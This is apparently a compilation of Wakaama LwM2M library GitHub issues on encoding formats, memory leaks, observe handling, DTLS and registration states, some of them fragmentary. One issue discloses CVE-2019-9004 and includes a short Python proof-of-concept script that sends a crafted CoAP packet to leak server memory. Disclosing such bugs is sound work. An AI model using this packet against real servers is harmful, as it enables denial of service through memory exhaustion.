title: Push for CBOR to be included in CoAP Content-Formats Registry?
body:
I was looking at https://github.com/eclipse/wakaama/blob/master/core/liblwm2m.h#L327 and saw that it contains the usual common encoding standards like JSON. Which matches https://tools.ietf.org/html/rfc7252#section-12.3 .

However I would think it would be a good time to get a registration number for CBOR included in the standard. Considering that CBOR is being used as a compact alternative to json in industrial sensors. (Due to compact wire size and compact encoder/decoder).

I'm just wondering what's your thought on this? And if so, whats the best approach to do so?

title: NA
body:
Hi,

Note that wakaama is an implementation of the Lightweight M2M standard (LwM2M). The specification of this standard can be found on the OMA website at https://www.omaspecworks.org/what-is-oma-specworks/iot/lightweight-m2m-lwm2m/. LwM2M 1.0 defines the usage of several encoding formats: text, TLV and JSON.

Supporting CBOR would not be part of the 1.0 standard. But, spoiler: it would be part of version 1.1 of the standard.

Regards,

title: Memory leak: registration_handleRequest

Question: C++ an option?
body: Is it an option to change the codebase to c++11 over time?

title: NA
body: Most of my projects are straight C. I wouldn't like to see this changed to C++.

title: NA
body:
It is basically c++ destructors, that I miss. Every now and then I find memory leaks in wakaama. And it really is quite challenging to handle object lifetime in C.

What exactly is your objection? Just keeping the C interface, having a c++ tool chain for a part of your project, overhead considerations or something else?

title: NA
body:
The C interface is a major thing, but there are other considerations also. First, the IAR compiler we use only supports ISO/IEC 14882:2003 C++, not C++11.

Just adding classes would be less objectionable than full C++. Some features can increase RAM/Flash requirements and slow processing. We're currently targeting an STM32L4 with 128k RAM and 512k flash running at 8MHz. Others may be targeting even smaller systems. Such resource usage is a significant concern.

Having destructors doesn't make C++ immune from memory leaks. If an object is created with new and never deleted it will still leak memory.

Speaking of new and delete, it can make memory management more challenging. Right now we have our own lwm2m_malloc and lwm2m_free that allocate from pools of fixed size buffers to avoid memory fragmentation. Ideally nothing in the system would use dynamic memory but I think we're beyond the level of complexity where that is possible and this is the compromise we've made.

title: NA
NA
body: I must admit I wasn't familiar with a custom new and delete. Would it be possible to do them custom just for Wakaama, or is it global?

title: NA
NA
body:
@davidgraeff Thanks for referring this topic to me.

Actually we have been working with Wakaama quit a few years. We have our  devices designed with our own lwm2m stack and use the wakaama for server side software to talk with the devices.

To be frankly, we are very opposite to this idea. Sometimes it is  hard to maintain the memory allocation/free, but with appropriate design pattern and tools like valgrind, it can be done. And it has to be done to build a reliable product.

In the current wakaama design, memory freeing is largely triggered by external messages and timers. Some memory issues can't be simply solved by C++ destruction mechanism. Introducing the C++ mechanism will make it even much harder to troubleshoot those touch memory leak issues (like by the complexity of status management). 

The memory free issue in the prv_getParameters() is actually easy to fix. it should should be fixed by diligence, rather than a "lazy" solution.

title: Json serialization of empty opaque values
body:
An OPAQUE resource is allowed to be empty, isn't it? If it is, the current code handles this case wrong.

In `json.c` in `prv_serializeValue` line 1122:
```c++
    case LWM2M_TYPE_OPAQUE:
        ...
        res = utils_base64Encode(tlvP->value.asBuffer.buffer, tlvP->value.asBuffer.length, buffer+head, bufferLen - head);
        if (res == 0) return -1;
```
The if condition should be removed. An empty opaque buffer should just result in an empty base64 string.

title: API question: lwm2m_connect_server(secObjInstID,userdata)
JSON content response is serialized incorrectly when resource is set in the request URI
body:
For example on reading reqest from /3/0/1 URI the client returns the following payload:
{"bn":"/3/0/1/","e":[{"n":"1","sv":"00000"}]}
The client serialize the payload as multi instance resource while the resource is of type string.

seems that json_serialize function should set rootLevel to URI_DEPTH_RESOURCE_INSTANCE only if tlvP->type==LWM2M_TYPE_MULTIPLE_RESOURCE

title: Hard use of observe notification callback
body:
Hi, Our application needs to ensure repeatedly collecting data from the lwm2m devices. The software will try to use obs mechanism if the device support observe, if not supported it will repeat READ from the device.

However we found it very hard to build robust solution with the obs notification callback if we want to handle exceptional situations, such as obs unsupported, obs timeout, device reset etc.

After spending time to look into the source code, it seems the "count" can provide some indication about the situation, however it is mixed use with the observe sequence indicator. So we can not be sure if it is the seuqnce number or status inidcator when its is value is "COAP_202_DELETED" for instance. Currently our solution is adding a "first" flag in the userData structure, we will use it to help checking the meaning of "count" parameter. 

Should we add addition parameter in this callback so the meaning won't be mixed?


void obs_notify_callback(uint16_t clientID,
                                lwm2m_uri_t * uriP,
                                int count,
                                lwm2m_media_type_t format,
                                uint8_t * data,
                                int dataLength,
                                void * userData)

"count" meaning digged from the source code:
Obs not supported: 
COAP_405_METHOD_NOT_ALLOWED
Obs Timeout: 
COAP_503_SERVICE_UNAVAILABLE
Device reset:
COAP_202_DELETED
Any other value:
The observe option as order indicator

title: NA
body:
Be sure that coap observe is adapted to you, often this is not the case.
See https://github.com/eclipse/leshan/wiki/LWM2M-Observe

Polling with read request or using new send operation from LWM2M 1.1 is maybe a better choice. 

Could we close this one ?

title: exception in observe_remove()
body:
@davidgraeff , We met an exception in the LWM2M server application. When the problem happens, the client process was just terminated, and a obs request was sent and eventually timeout.

note: there was already obs on the object when the new request was sent. It was triggered by a protection to ensure the obseration is alway on - the software will send a new obs if no notified data recieved exceed the pmax period.

This mechnism may be questionable, however we don't expect any exception like this. We tried to find out the reason from the stack but no clue on the reason.

title: NA
body:
```
__GI___libc_free() at malloc.c:2,968 0x7ffff765353c
lwm2m_free() at platform.c:33 0x7fffeea58ed0
observe_remove() at observe.c:791 0x7fffeea50a4b
```
Looks like a double free corruption

title: NA
body:
![screenshot from 2018-07-17 16-12-42](https://user-images.githubusercontent.com/19812231/42805258-ee329b92-89dd-11e8-8a5e-978c9e7cc60b.png)

Hi @davidgraeff We have done some study on the source code about this issue. We suspect such as work flow introduced this problem.

1) the device go offline in fact, but not detected by the lifetime timeout yet
2) lwm2m_observe() was called on the object of this device
3) device offline detected by timeout, then registration_handleRequest() removed all the observation context for the client
4) the observe transaction timeout, prv_obsRequestCallback() tried to free the same pointer attached in the transaction.
5) the exception happened as it was already freed.

ln regard to the fix, it looks the observation context management is pretty fragile, a fix to this single issue may not solve similar problems. Please refer to the picture I attached, the observation pointer can be referred by many ongoing transactions. That can introduces many breaks.

To remove the complexity, one option will be let each transaction (observe/cancel obs) have a new allocated context object. We only do change to the observationList in the transaction internal callbacks. If a observation is already present for the object, then remove the existing and add the new one into the list.

Assuming the transaction memory freeing mechanism is solid, it will help to ensure any context attached to the transaction can be properly freed.

We would like to know what is the plan on the issue.  We could make changes in our project and then contribute to the project.  We don't prefer a private fork because it is burden for maintenance.

title: tinyDTLS retransmission
body:
According to RFC6347 (DTLS), a retransmission mechanism is defined if a handshake does not succeed if any packet is lost (https://tools.ietf.org/html/rfc6347#page-20)
In tinyDTLS, when the WITH_CONTIKI flag is not embedded, it seems that this retransmission is not managed in Wakaama.
A public tinyDTLS function is defined in dtls.c (dtls_check_retransmit) but not used in Wakaama.
I think that this retransmission needs to be managed in Wakaama (in // to CoAP retry mechanism)

title: NA
body:
Seem that the client needs to support in this case the dtls_check_retransmit
The Wakaama client example is just an example. To be managed by the user :)

title: NA
body: In fact, I think that this is a real issue which is not handled by the wakaama client example

title: NA
body:
From your first post, "when bs server is insecure and the main server is kept in secured mode" it works.
So when can rule out a wrong configuration of the leshan server account.

I thought the BS Server was deployed locally but it seems you are also using `leshan.eclipse.org` for bootstrapping, right ?

If this is the case, my bet is on a DTLS issue. A DTLS session is created to connect to the BS Server. When connecting to the LwM2M Server, as the hostname is the same, maybe your implementation reuse the same DTLS session. Thus registration packets are sent to the BS Server instead of the LwM2M Server.

Regards,

title: LWM2M Server fail over / DTLS exchange Role
body:
Hi,

  I'm currently trying to understand how to handle correctly server fail-over with LWM2M protocol.
  The main issue is about the DTLS connection. As generally there are lost after a reboot.

  1. A solution could be to persist/share DTLS connection but currently I don't know any implementation which are able to do that. (I'm not even sure if this is a good thing to do..)

  2. The other solution is to do a new handshake when DTLS connection is lost.
  There is 2 use cases, "queue mode" and "standard mode/none queue mode". For queue mode, I don't see any issue. But for "standard mode", this is more problematic and the only solution I can see is "DTLS role exchange".

   [Here](https://github.com/OpenMobileAlliance/OMA_LwM2M_for_Developers/issues/410) is a more complete description of the LWM2M issue.  
   [Here](https://github.com/sbernard31/dtls-server#dtls-role-exchange) is a more precise description of what I name "DTLS role exchange".

   So I'm experimenting this idea (with PSK for now). I succeed to make it works with `leshan-client-demo` and `leshan-server-demo`.

   I try with `lwm2mclient` of wakaama and `leshan-server-demo`, but it failed just because of some little bugs. I fixed those bugs in this PR #397 and it seems OK now.

   If you want to test. You can simulate the  `leshan-server-demo` fail-over using redis and really restarting the server. Or more simple way you can take [this modified version of `leshan-server-demo`](https://github.com/sbernard31/leshan/releases/download/DTLS_Exchange_Role/leshan-server-demo-1.0.0-SNAPSHOT-jar-with-dependencies.jar) and use the `clear` command to delete all the DTLS connections.

This looks like this :
```
>> java -jar leshan-server-demo-1.0.0-SNAPSHOT-jar-with-dependencies.jar      
[main] INFO  o.e.l.s.c.i.LeshanServer - LWM2M server started at coap://0.0.0.0/0.0.0.0:5683 coaps://0.0.0.0/0.0.0.0:5684 
[main] INFO  o.e.l.s.d.LeshanServerDemo - Web server started at http://0.0.0.0:8080/. 
clear
[main] INFO  o.e.l.s.d.LeshanServerDemo - DTLS Connections cleared 
...
```

I would really appreciate to know your opinion about this ? (especially @dnav)

Thx.

title: NA
body:
Currently it seems, that more and more "issues in LWM2M" (especially observe/notify)  are reported, which caused by the environment (NAT) and not by the implementations. I hope this idea of exchange the DTLS roles will not also get a hot spot of issues caused by misunderstandings of the network environment.

So, just to mention:
A resuming handshake with exchanged roles would also be possible. 
On the LWM2M server side implement a persistent `ClientSessionCache` and after restart scandium would try a resuming handshake. A a resuming handshake with exchanged roles would not require to use the "credentials" and seems FMPOV easier.

One issue, which may occur (hopefully not to frequently), will be overlapping handshakes from the LWM2M server and the LWM2M client. That will fail. But you will find it out, if it is that frequent, that something is required to solve that issue, or not.
Finally, I would really appreciate, if in the end we get some statistic about successful and failing "reverse" handshakes.

title: two clients assigned the same internal client ID
body:
Here is the situation:
Two client devices both are in registered status and notifying data to the wakaama server. However only one client can be seen from the server side.

The possible reason:
one client (#1) is actually a process running in the same machine as wakaama server, another client (#2) is an independent device. The server and client #1 both had a  reboot and client #1 registered as ID 0. however the client#2 was also registered as internal ID 0 previously.  Now the server and both clients can not tell any problem for this situation.

Solution options:
1. the wakaama server should not always start allocating internal ID from 0. It better be some random number. That can reduce the possibility of this situation
2. the wakaama server can check the source IP/port for Update/Notify messages and reject it if not match the original address from registration. The current wakaama design is just update the client to the new source address.

@dnav could you please give some comments on this issue?

title: NA
body:
I guess you are not using any DTLS which would prevent this issue.

option 2. is not feasable since this is the expected behavior. A registered Client may have a new external IP address due to NAT.

title: NA
body: @Kevin0626  should we close this issue ?

title: NA
body: I close this issue but feel free to reopen if needed.

title: utils_intToText() issue
body:
If passed number is 12345 and length is 6 , the returned buffer will contain"123455". This is because the last space keep the content before calling memmove. Although the returned value indicates the correct length which is 5 in this case, however the caller may ignore it. Just like the prv_getLocationString(), it will provide whole string "123455" regardless of the return length.

I would suggest to modify the utils_intToText() to ensure value zero is filled for the padding spaces. That avoid similar errors in the future.

title: NA
body: Have you found a case where the caller is ignoring it, or is this a usage in your own code? If wakaama is using it incorrectly, that usage should be corrected. To be clear, I have no objection to the change you propose but if there is a bug in wakaama I would like to see that fixed also.

title: NA
body: prv_getLocationString() in wakamma actually ignored the return value. and I have a pr for the fix.

title: `registration_getStatus` issue
body: In `registration_getStatus` function, if `status` is `STATE_DEREG_PENDING`, the following registration status is returned: `STATE_REG_FAILED`

title: NA
body: @sbertin-telular is it sill valid for v1.0 or master branch ?

title: NA
body: Yes, it is still valid.

title: NA
body:
[client_states.pptx](https://github.com/eclipse/wakaama/files/5952441/client_states.pptx)

It is not clear (to me) what the problem is that should be fixed. `registration_getStatus()` "aggregates" a number of `lwm2m_status_t` states according to this logic (quoted from the function definition)

> Returns STATE_REG_PENDING if at least one registration is still pending
> Returns STATE_REGISTERED if no registration is pending and there is at least one server the client is registered to
> Returns STATE_REG_FAILED if all registration failed. 
 
The `lwm2m_step()` handles the `lwm2m_client_state_t` state transition logic using `registration_getStatus()`. A STATE_REG_FAILED response result in a state transition to STATE_BOOTSTRAP_REQUIRED, see attached powerpoint.
Aggregating and "reusing" a state name like this can be confusing but the logic is correct or am I missing something?

title: NA
body:
I'm not sure to understand too, but maybe the question is : 
If we have a server in STATE_**DEREG_PENDING**,  do we consider we still are in a REGISTERED state or are we already considering we are in a FAILED state ?

> Aggregating and "reusing" a state name like this can be confusing 

I agree reusing this name are confusing.

title: NA
body: Yes I think we should have a separate response codes for the aggregated states. It is currently only used in by one other function but I also think we should consider renaming the function since that in combination of the reused return type is a bit confusing. I also think *_PENDING, *_REGISTERED, *_UNREGISTERED, not saying anything about the cause as to why it is unregistered.

title: NA
body:
PR #538 updates `registration_getStatus()` so that a server connection in state `STATE_DEREG_PENDING` is considered as still registered. This makes sense and is safe. If no reply is received from any retransmission, transaction timeout will cause transition to `STATE_DEREGISTERED` anyway. Little practical difference for the client state logic (only timing).

Not including refactoring in this bugfix. New states to solve the "reuse" problem is not without drawbacks, suggest a separate improvement issue if we want to refactor this, also including the `bootstrap_getStatus()` function.

title: Does wakaama support use of certificate?
body:
Hi,
I have these two questions about wakaama client:

- Does wakaama client support getting certificate from bootstrap server (e.g Leshan)? I tried to bootstrap my device (unsecurely with Leshan) and the client can receive authentication info + lwm2m server URI if the next authentication mechanism will be PSK or unsecured but fail in case of certificate. I only attempted to get bootstrap info and print out details of the security object.

- Does wakaama client support certificate authentication with the lwm2m server?

title: NA
body: According to the README for tinydtls (https://git.eclipse.org/c/tinydtls/org.eclipse.tinydtls.git/tree/README) only PSK and RPK are supported. There is no mention of certificates. If you need DTLS with certificates in your own client, you will need to use different DTLS support, such as OpenSSL or mbed TLS.

title: NA
body:
Thank you for your reply, I think I should take a look at another dtls lib instead of tinydtls.

Sorry my question above may be a bit misleading. Please let me clarify it. 

I am thinking that wakaama don't "download" certificate from the bootstrap server (ignoring the dtls authentication process with the lwm2m server that is to come later). From my understanding the bootstrap process is just the bootstrap server write authentication info into the security object of the lwm2m client and the lwm2m client take that info to authenticate with the lwm2m server (please correct me if I am wrong).  In the PSK case the client got the credentials (which I printout and checked with info on bootstrap server), but client does not "download" certificate correctly. So, again I was wondering whether certificate is supported by wakaama . The file liblwm2m.h defined:

> #define LWM2M_SECURITY_MODE_PRE_SHARED_KEY  0
#define LWM2M_SECURITY_MODE_RAW_PUBLIC_KEY  1
#define LWM2M_SECURITY_MODE_CERTIFICATE     2
#define LWM2M_SECURITY_MODE_NONE            3

so I was expecting wakaama support use of certificate. The real secure communication should be taken care by OpenSSL or mbedTLS.

title: NA
body:
I'm not sure I understand what you are asking, but I'll try to clarify.

Your understanding of the bootstrap process is close, but the bootstrap server also writes a server object that has non-security related information about the server, such as the registration lifetime. This probably isn't relevant to your question, I just wanted to be clear that the bootstrap process is more than just the security object.

The bootstrap server writes all the authentication info to the security object, the client doesn't download anything. In the PSK case, there is no certificate. There is only the key and the identity. I suggest you review Appendix E.1 of the LWM2M technical spec (http://www.openmobilealliance.org/release/LightweightM2M/V1_0_2-20180209-A/OMA-TS-LightweightM2M-V1_0_2-20180209-A.pdf) if you haven't already.

If you are just trying to bootstrap with certificate mode, it might succeed but the sample security object isn't really written to handle it. There may be other problems, such as leaking memory, when using it for RPK or certificate mode.

title: NA
body: @syhoangmai could we close this issue now ?

title: NA
body: I close this issue but feel free to reopen if needed.

title: LwM2M Client Name limit in a custom LwM2M server
body:
## Description
When compiling our custom LwM2M server based on **wakaama/core/liblwm2m.h" with -O2 optimization level, LwM2M Client Names are limited to 11 characters, compiling the same code without any optimizations avoids this problem. This was tested with wakaama lwm2mclient example. 

## Possible solution 
Adding volatile keyword to size_t option_len in  **wakaama/core/er-coap-13/er-coap-13.c:257** fixes the problem.

```
-- coap_add_multi_option(multi_option_t **dst, uint8_t *option, size_t option_len, uint8_t is_static)
++ coap_add_multi_option(multi_option_t **dst, uint8_t *option, volatile size_t option_len, uint8_t is_static)
```
I am using 9865bd30910a7d3d4c1a3dbd1546e7ab3886f152 commit of wakaama with a few changes (I know it is very old), but as far as I see neither the changes nor the outdated commit should cause this behaviour. I haven't checked if other functions need the keyword **volatile**. Could anyone else try to replicate this problem?

title: NA
body: lwm2m_resource_value_changed would need to be changed within the application code, not within the code for the object. This would ideally be just after you write the new value to the database. Have a look at the prv_change function in lwm2mclient.c for an example.

title: NA
NA
body:
Wakaama is meant to be integrated into a larger application that manages the device. lwm2mclient.c is code meant to serve as an example and facilitate testing. If you are using lwm2mclient.c directly, then yes you will need to modify that. The database write does not need to be moved to lwm2mclient.c. You could implement some other way of detecting changes to the database such as periodically reading the value and checking for changes. If you do that, I would recommend checking more frequently than it could change to avoid missing changes.

If this is for a product, not just a personal project, I would recommend you write your own application or integrate Wakaama into your existing application instead of using lwm2mclient.c because it may not be up to production quality standards.

title: Memory leak while processing crafted packet
body:
Wakaama LWM2M server incorrectly handles incoming packets leading to a memory leak.
Processing of the single crafted packet leads to leaking (wasting) 24 bytes of memory.
This can lead to stopping of the LWM2M server after exhausting all available memory.
Depending on server configuration and isolation of services, this can stop also other processes on the same server.

Proposed CVSS 3.0 Score:

On systems with modern memory protection and isolation of services:
5.3 (medium) - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L

On systems with lower memory protection and no isolation of services:
7.5 (high) - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

Reproduction:

1. Wakaama must be compiled with Leak Sanitizer (or other similar tool) by setting compilation flag:
    C_FLAGS = -fsanitize=address

2. Run Wakaama server as:
    lwm2mserver -4 -l 55555

3. Run following Python2 script (running multiple times will show larger leak):

    -------------------------------------------------------

    import sys
    import socket

    WAKAAMA_PAYLOAD = "4402e6e2e2e68167b2726411"
    out_data = WAKAAMA_PAYLOAD.decode('hex')
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM )
    s.sendto(out_data, (sys.argv[1], int(sys.argv[2])))

    -------------------------------------------------------

    Execution of the script:

    python2 wakaama_test.py dst_ip dst_port
    (where: dst_ip and dst_port are IP and port of tested Wakaama server)
    e.g.:
    sudo python wakaama_test.py 192.168.0.101 55555


4. Close the lwm2mserver to get report from Leak Sanitizer:

    > 12 bytes received from [....]:....
    44 02 E6 E2  E2 E6 81 67  B2 72 64 11   D......g.rd.
    ^C
    =================================================================
    ==19153==ERROR: LeakSanitizer: detected memory leaks

    Direct leak of 24 byte(s) in 1 object(s) allocated from:
        #0 0x7f4fa293b602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602)
        #1 0x42f1df in lwm2m_malloc (/wakaama-master/build_asan/lwm2mserver+0x42f1df)
        #2 0x425ad6 in coap_add_multi_option (/wakaama-master/build_asan/lwm2mserver+0x425ad6)
        #3 0x42910f in coap_parse_message (/wakaama-master/build_asan/lwm2mserver+0x42910f)
        #4 0x412aac in lwm2m_handle_packet (/wakaama-master/build_asan/lwm2mserver+0x412aac)
        #5 0x4088e2 in main (/wakaama-master/build_asan/lwm2mserver+0x4088e2)
        #6 0x7f4fa24f982f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)

    SUMMARY: AddressSanitizer: 24 byte(s) leaked in 1 allocation(s).

title: NA
body: For this vulnerability following ID was assigned: CVE-2019-9004

title: Typecasting causing undefined behavior
JSON and SenML JSON can't omit instance for create
body: The JSON and SenML JSON formats require the object instance ID for serialization and parsing. This prevent them from being used for a Create without an instance ID. They need to generate and recognize something that looks like "/31024//" to allow Create without an instance ID.

title: NA
body: I just found OpenMobileAlliance/OMA_LwM2M_for_Developers#422 which is related. The work done here should follow from the resolution of that issue.

title: NA
body: Leshan uses -1 for the object instance ID for the JSON format when creating without an instance ID.

title: NA
body:
Using -1 was a bug and this is now fixed on Leshan.
For [JSON we just forbid it](https://github.com/eclipse/leshan/blob/leshan-1.2.0/leshan-core/src/main/java/org/eclipse/leshan/core/request/CreateRequest.java#L225).
For [SenML JSON/Cbor ](https://github.com/eclipse/leshan/issues/917)we are waiting for OMA answer but my guess this will not be allowed in LWM2M 1.2.

title: Update message interval (180s)
body:
Hi,
I'm using wakaama ( DTLS/PSK) with leshan-demo-server locally. I observed 180s as interval for LwM2M update message and DTLS handshake also. For this observation, I used wireshark.  How do you set? how can configure? 

Thanks

title: NA
body: The default lifetime for the example client is 300s and can also be changed by the -t option. The update will happen before then to prevent expiration. The maximum time a CoAP transaction can take is 120s. If the lifetime is greater than that, the first update attempt will be 120s before the end of the lifetime. If the lifetime is less than 120s (not recommended), the first update attempt will be at half the lifetime.

title: NA
body: @sbertin-telular , thanks, That's the case for LwM2M update interval. Why DTLS is also doing rehandshake in similar interval? If understand properly, DTLS connection can exist for one day?  (except NAT situation with 40s).

title: NA
body: I haven't looked closely at the DTLS support in the example client to be able to comment on the rehandshake.

title: NA
body:
You may have a look at:

https://github.com/tlswg/dtls-conn-id/blob/master/draft-ietf-tls-dtls-connection-id.md

It's in the meantime implemented in californium (2.0.0-M15). 
A simple client support, which just enables the new extension and then uses the cid, if returned, would not be too complex (I guess just a couple of days for tinyDTLS). I'm currently waiting for the IANA assignments. We will see, if there is interest in. 

If you just want to check, how that works in your environment, try californium 2.0.0-M15 and provide some feedback to me. AFAIK Leshan also updated to 2.0.0-M15 so you should even be able to see, how this works with LWM2M.

title: NA
body: Hello @boaks , I didnt find the way how to check connectin-id in leshan-client-demo? please provide i can check.

title: NA
body:
You need to configure it with the `DtlsConnectorConfig.Builder` in LeshanDemoServer and the LeshanDemoClient. To enable DTLS 1.2 connection ID on the server side, set 
a new SingleNodeConnectionIdGenerator(6) (e.g. a 6 byte cid), and on the client at least to support it with new SingleNodeConnectionIdGenerator(0), or also a new SingleNodeConnectionIdGenerator(6) (a 6 byte cid). Both are set in the `DtlsConnectorConfig.Builder` with `setConnectionIdGenerator`.

title: NA
NA
body:
I'm not sure, if setting it Californium.properties works with leshan. There must be some code, which loads those configuration and set it to the `DtlsConfiguration` instance.
You may use WireShark to see, if still application records are used (then no cid is used), or not.

> One more question, if I fixed connection-id in client side, and I reboot the device, it will do complete handshake or only re-handshake with simple flows.

That's a misunderstanding! To really reboot a peer, the association credentials (read/write key, sequence number and the assigned connection id) has to be persisted and loaded again. That's possible to implement, but right now, not implemented in Californium.  
With that, you would not need a handshake at all, you would be able to send the message encrypted immediately. To save the keys come with the risk, that some else is reading them. So it's critical to save 
this key secure enough according your requirements.

Without that persistent "association", the behaviour doesn't differ from the one without connection ID. If the session (master secrets etc., but not the read/write keys an sequence numbers as for the association) is persisted and loaded again (that's supported, see [ClientSessionCache](https://github.com/eclipse/californium/blob/master/scandium-core/src/main/java/org/eclipse/californium/scandium/dtls/ClientSessionCache.java) you can do a resumption handshake, if not. a full handshake is required. Saving the session is also security relevant and must be protected according your requirements.

title: Bootstrap-Delete incorrectly deletes the Security object for the bootstrap server
body:
The LWM2M spec states:

> Only in Bootstrap Interface, the Delete operation MAY targets “/0” URI. In that case, the operation MUST delete all the existing Security Object Instances - **except LwM2M Bootstrap-Server Account** - in the LwM2M Client;


and:

> if no Object ID is indicated, all existing Object Instances (**except the LwM2M Bootstrap-Server Account one**) in the LwM2M Client will be deleted.

The boostrap Security object should only be deleted if that instance is specifically deleted.

title: NA
body: Delete all works properly, but delete /0 does not.

title: NA
body: Yes, that is a good question and I was wondering it myself. It seems that @sbertin-telular has done a lot of work on v1.1, but his changes have not been merged.

title: NA
body:
My changes are all available at https://github.com/sbertin-telular/wakaama/tree/lwm2m_1.1. Not everything has had pull requests created due to dependencies on other open pull requests (it gets messy). TCP support is not yet available.

There are still some items not yet implemented (no particular order):
•	New attributes (Minimum/Maximum evaluation period) and attributes at the resource instance level. Attributes as a whole could use a rework to be compliant.
•	Write-Composite. With the current Wakaama design I’m not sure this can be implemented atomically.
•	Observe-Composite
•	Cancel Observation-Composite
•	TCP binding. @dnav  has said (wakaama-dev 2/20/2019) that he has already implemented it, but it hasn’t been released yet.
•	LWM2M 1.1.1 compatibility changes
•	New optional resources in objects for the client example
•	OSCORE. @dnav  has said (wakaama-dev 2/20/2019) someone is working on this.
•	Enforcing access control. LWM2M 1.1.1 makes this optional for an “Access Control-Disabled” configuration where only 1 server is supported.

title: Why does wakaama not support UTC+13 time zone?
body:
According to wiki page https://en.wikipedia.org/wiki/UTC%2B13:00 time zone UTC+13 is used in Samoe and Tokelau. But function prv_check_time_zone from examples/client/object_device.c perceives this time zone as erroneous. 
Does ISO8601 really not support UTC+13? Or is it a bug in prv_check_time_zone?

title: NA
body: I would assume it is a bug in prv_check_time_offset. According to https://en.wikipedia.org/wiki/List_of_UTC_time_offsets the range should be -12 to +14.

title: should ip change trigger reregister
body:
When my client is registered and the local IP changes, any message sent to the server is answered with a 4 byte RST message (in case of Leshan server).
Then all observes are cleared in the client, but I would expect the client to also send a new register message notifying the server of the new IP address.
I'm trying to either use lwm2m_close() or try with lwm2mH->state = STATE_INITIAL but I do not know what is the best way?

title: NA
body:
If the IP changes, the client should send a registration update with `lwm2m_update_registration`.

In addition, if DTLS is used, the story becomes different, as there's relaxed session based matching in leshan with the DTLS CID extension. https://github.com/eclipse/californium/issues/824

title: Endpointname and DTLS Public identity
body:
According to 1.0.2 endpointname must be compared with the identifier in the dtls handshake. _"The LwM2M specification defines the use of the endpoint client name in the Bootstrap-Request and in the Register messages.
Since the endpoint client name is not authenticated at the application layer the LwM2M Server MUST compare the received
endpoint client name identifier with the identifier used at the DTLS handshake."_

My questions are:
Do i have to support multiple endpoint names if i am using PSK for encryption? One for each server?
Do i have to use the resource /0/x/3 as endpoint name? Is there anything i am missing?

title: NA
body:
I'm not sure this is clearly expressed in the 1.0.x specification, but I understand that the idea is "endpoint name should be unique by device".
The §6.3.1 tries to encourage a format which guarantee uniqueness, this a hint.
And so could be used though several servers.

The specification 1.1.x give more hints about that: 
_"The Endpoint Client Name identifier MUST be unique at the server or servers it is being used with."_  ( see [7.3.1. Endpoint Client Name](http://www.openmobilealliance.org/release/LightweightM2M/V1_1-20180710-A/HTML-Version/OMA-TS-LightweightM2M_Core-V1_1-20180710-A.html#7-3-1-0-731-Endpoint-Client-Name))

>  Do i have to support multiple endpoint names if i am using PSK for encryption? One for each server?

I would say no. You are using only one endpoint name and you can eventually used different PSK identity but at servers side you should say : "on this server, the device will this endpoint name MUST use this PSK identity" and server should check this.

This is how I understand : 
_"This comparison may either be an equality match or may involve a dedicated lookup table to ensure that LwM2MClients cannot intentionally or due to misconfiguration impersonate other LwM2M Clients._" (source LWM2M 1.0.2 §7.15)

>  Do i have to use the resource /0/x/3 as endpoint name? Is there anything i am missing?

I would say no too. When using PSK, this is for  PSK Identity not the endpoint name.

title: Are there relations between /1/0/17  /1/0/18  (LWM2M_SERVER_SEQ_DELAY_TIMER_ID)?
body:

  I want to know ,how to use resource  /1/0/17 and 1/0/18,

  are there some arithmetic between resource  /1/0/17 and 1/0/18?
  Thank you~~

title: NA
body: The LWM2M specifications are available from http://openmobilealliance.org/wp/index.html. I suggest you review section 6.2.1.1 of http://www.openmobilealliance.org/release/LightweightM2M/V1_1_1-20190617-A/OMA-TS-LightweightM2M_Core-V1_1_1-20190617-A.pdf. In short, /1/0/17 is the number of attempts and 1/0/18 is the delay between attempts. They can be set independently to meet your requirements.

title: registration time out when prv_updateRegistration msg lost
body:
when update hearbeat with prv_updateRegistration , client will enter STATE_REG_UPDATE_PENDING status, normally server will response and client enter STATE_REGISTERED status, everythins is ok. 
However, when the msg of prv_updateRegistration sent by transaction_send lost, server cannot response a update register msg(this probability is quite high in wireless connection), client still in STATE_REG_UPDATE_PENDING status all the time, so registration will time out in the end.
maybe when client enter STATE_REG_UPDATE_PENDING  status for a while, it should update registration again to keep the connection.

title: NA
body:
The registration update is a confirmable message, so multiple attempts are made to update the registration. When the transaction finishes all attempts and times out, the client will set the server to STATE_REG_FAILED. I believe it is 5 attempts over 247s with increasing delays between attempts before timeout.

It could be argued that a registration update timeout before the registration lifetime has expired should return to STATE_REGISTERED status and try again later. At that point though it has already proven an inability to communicate with the server and a new registration with a new connection may be the safer option.

> 50 00 00 00  00 00 00 00  50 FE FD 5F  59 ED 0A 6D   P.......P.._Y..m

> A4 C0 A5 01  00 00 12 00  0A 00 08 00  06 00 17 00   ................
> 18 00 19 00  0B 00 02 01  00                         .........
> Sep 10 05:08:26 ALRT No security context for epoch: 0
> 

means, the client doesn't accept the server's CLIENT_HELLO ...

Two ways to go:
- @sbernard31 do you know, how to setup the wakaama client to accept a CLIENT_HELLO, if the client has still a established session?
- try out to configure the leshan server not to start handshakes. Ask in that project, how to achieve that.

And, keep your fingers crossed :-).

title: NA
body:
Generally Leshan Server initiate an handshake when it does not have dtls connection for a device.
This generally happens when you persist registration and you restart the server.
If you don't do that I suspect that the server initiated handshake failures hide another issue.

> @sbernard31 do you know, how to setup the wakaama client to accept a CLIENT_HELLO, if the client has still a established session?

I made it works long time ago but I'm not up to date now. 
See  https://github.com/eclipse/wakaama/issues/398. It worked after some little fix which was merged in master.

title: NA
body:
The error is because you try to send a request to a device for which you have no DTLS connection.
(before Leshan tried to initiate an handshake, now you set Leshan as server only so it says there is no DTLS connection for this device and so he can not send the request.

The question is why you lost the DTLS connection ?
E.G. this could be because device close it (by sending close_notify) 
I tried to look at your device log but I don't get it. Maybe a wireshark capture could help you to find what happens.

title: Possible NULL dereference in wakaama/core/observe.c
body: In function observe_step(), dataP is initialized with NULL. If LWM2M_URI_IS_SET_RESOURCE(&targetP->uri) returns false, dataP will be NULL in the whole function. However, dataP is dereferenced through dataP->type in some places. I am not sure if all of them are unreachable.

title: NA
body: I think this is a good catch. The observe could be at the object or object instance level. If the server then sets a numeric attribute (which shouldn't happen, but could) I don't see anything to prevent a numeric attribute from being set. This would cause the dataP->type to be evaluated.

title: NA
